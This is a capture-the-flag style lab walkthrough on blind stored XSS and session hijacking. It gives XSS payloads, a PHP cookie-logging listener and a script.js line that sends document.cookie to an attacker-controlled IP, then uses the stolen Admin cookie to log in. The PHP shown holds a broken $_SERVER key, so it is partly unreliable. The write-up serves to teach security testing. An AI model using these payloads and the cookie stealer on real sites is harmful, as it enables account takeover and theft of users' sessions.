---
description: >-
  Try to repeat what you learned in this section to identify the vulnerable
  input field and find a working XSS payload, and then use the 'Session
  Hijacking' scripts to grab the Admin's cookie and use it
---

# Session Hijacking

### Step 1: Register a user

1. First, we need to fill out a form to register as a user. We enter some information and hit the submit button.

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 15-05-03 (2).png" alt=""><figcaption></figcaption></figure>

2. Once we do that, we see a message saying we registered successfully!

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 15-06-57 (2).png" alt=""><figcaption></figcaption></figure>

But here’s the tricky part: we can’t see what happens next because only the Admin can see that information in a special panel, and we don’t have access to it. Normally, we could test things to see if they work, but since we can’t see the Admin panel, how can we check if there’s a problem (called an XSS vulnerability) with our input?

### Step 2: Loading some Scripts

To find out if there’s a problem, we can use a clever trick. We’ll write a little piece of code (called a JavaScript payload) that sends a message back to our computer. If this code runs, it means the page has a vulnerability.

**Step 3: Create a Helper File and Test Our Payload**

Next, we need to create a file called `index.php`. This file will help us catch the messages. Here’s what we put in it:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['10.129.2.3']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Now, we try different payloads to see which one works. Here are some examples:

```html
'><script src=http://10.10.14.32/fullname></script>
"<script src=http://10.10.14.32/username></script>
"><script src=http://10.10.14.32/image></script>
```

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 15-37-12.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 15-42-03.png" alt=""><figcaption></figcaption></figure>

When we check our logs, we see a message that tells us one of our payloads worked!

### **Step 4: Create a JavaScript File**

Now, we need to make another file called `script.js`. This file will help us send our cookie (a little piece of information) back to us. Here’s what we write in it:

```bash
new Image().src='http://10.10.14.32/index.php?c='+document.cookie
```

### **Step 5: Put Our Trick in the Form**

Next, we go back to the form and paste our payload in all the fields except for the email and password. Here’s the payload we use:

```html
"><script src=http://10.10.14.32/script.js></script>
```

### **Step 6: Start the Helper Server**

Now, we need to run a command to start our helper server. We type this in:

```bash
sudo php -S 0.0.0.0:80
```

### **Step 7: Check for Messages**

After running the server, we check our logs (like a diary) to see if we caught any cookies. And guess what? We see the cookie!

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 15-54-41edited (1).png" alt=""><figcaption></figcaption></figure>

### **Step 8: Change the Cookie**

Now, we go to the `login.php` page and use inspect element to change the cookie. We find where it says "Storage" and "Cookies," click a plus sign, and paste our cookie value. We also change the name to "cookie."

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 16-00-28.png" alt=""><figcaption></figcaption></figure>

### **Step 9: Get the Flag**

Finally, we can see the secret message (the flag) that we were looking for!

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-12 16-08-39edited (1).png" alt=""><figcaption></figcaption></figure>

